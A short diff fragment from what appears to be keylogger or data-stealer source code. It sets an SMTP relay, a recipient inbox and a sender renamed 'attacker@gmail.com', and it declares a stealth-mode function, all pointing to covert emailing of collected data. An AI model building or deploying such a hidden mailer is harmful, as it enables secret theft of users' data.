@@ -19,7 +19,7 @@
 
 // Email sender defines:
 #define GMAIL_SERVER "gmail-smtp-in.l.google.com"
-#define EMAIL_FROM "tester@gmail.com"
+#define EMAIL_FROM "attacker@gmail.com"
 #define EMAIL_TO "toothless5143@gmail.com"
 
 void verifyStealthMode();
